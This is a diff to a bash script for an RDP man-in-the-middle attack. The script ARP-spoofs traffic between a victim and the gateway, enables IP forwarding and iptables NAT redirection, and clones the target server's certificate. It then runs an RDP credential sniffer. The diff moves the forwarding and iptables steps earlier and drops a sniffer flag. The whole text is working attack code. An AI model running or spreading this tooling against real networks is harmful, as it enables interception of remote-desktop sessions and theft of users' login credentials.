@@ -30,14 +30,18 @@ function finish {
 }
 trap finish EXIT
 
-echo "[*] Turning off IP forwarding..."
-
-echo 0 > /proc/sys/net/ipv4/ip_forward
-
 echo "[*] Spoofing arp replies..."
 
 arpspoof -i "$IFACE" -t "$VICTIM_IP" "$GATEWAY_IP" 2>/dev/null 1>&2 && ARP_PID_1=$! &
 arpspoof -i "$IFACE" -t "$GATEWAY_IP" "$VICTIM_IP" 2>/dev/null 1>&2 && ARP_PID_2=$! &
+
+echo "[*] Turning on IP forwarding..."
+
+echo 1 > /proc/sys/net/ipv4/ip_forward
+
+echo "[*] Set iptables rules..."
+
+iptables -t nat -A $IPTABLES_PARAMETERS
 
 echo "[*] Waiting for a SYN packet to the original destination..."
 
@@ -53,14 +57,6 @@ CERT_KEY="$($SCRIPT_DIR/clone-cert.sh "$ORIGINAL_DEST:3389")"
 KEYPATH="$(printf "%s" "$CERT_KEY" | head -n1)"
 CERTPATH="$(printf "%s" "$CERT_KEY" | tail -n1)"
 
-echo "[*] Turning on IP forwarding..."
-
-iptables -t nat -A $IPTABLES_PARAMETERS
-
-echo "[*] Set iptables rules..."
-
-echo 1 > /proc/sys/net/ipv4/ip_forward
-
 echo "[*] Run RDP proxy..."
 
-$SCRIPT_DIR/rdp-cred-sniffer.py -c "$CERTPATH" -k "$KEYPATH" -g 1 "$ORIGINAL_DEST"
+$SCRIPT_DIR/rdp-cred-sniffer.py -c "$CERTPATH" -k "$KEYPATH" "$ORIGINAL_DEST"
